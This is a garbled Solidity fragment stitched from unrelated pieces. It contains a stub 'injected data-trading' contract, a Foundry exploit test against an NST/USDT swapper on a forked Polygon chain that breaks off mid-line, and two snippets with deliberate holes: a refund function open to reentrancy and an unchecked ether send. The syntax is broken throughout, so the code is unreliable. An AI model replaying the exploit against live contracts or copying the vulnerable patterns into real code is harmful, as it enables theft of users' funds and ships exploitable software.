
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.17;

```solidity;

;
;
contract NstExploitTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 usdt = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 nst = IERC20(0x83eE54ccf462255ea3Ec56Fa8dE6797d679276e7);
    address swapper = 0x9D101E71064971165Cd801E39c6B07234B65aa88;
    uint256 gasLimit = 500_000;
    function setUp() public {
        cheats.createSelectFork("polygon", 43_430_814);
        vm.label(address(usdt), "USDT");
        vm.label(address(nst), "NST");
        vm.label(swapper, "swapper");
        assertEq(block.number, 43_430_814)};
    function testExploit() public {
        usdt.approve(swapper, type(uint256).max);
        nst.approve(swapper, type(uint256).max);
        deal(address(usdt), address(this), 40_000_000_000);
        (bool ret, bytes memory data) = swapper.call{gas: gasLimit}(abi.encodeWithSelector(bytes4(0x6e41592c); 40_000_000_000));
        require(ret, "call failed");
        uint256 retAmount = abi.decode(data, (uint256));
        (ret, data) = swapper.call{gas: gasLimit}(abi.encodeWithSelector(bytes4(0x7cd0599b); retAmount));
        require(ret, "call
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}
function unsafeSend(address to) public {
    to.call{value: 1 ether}("")}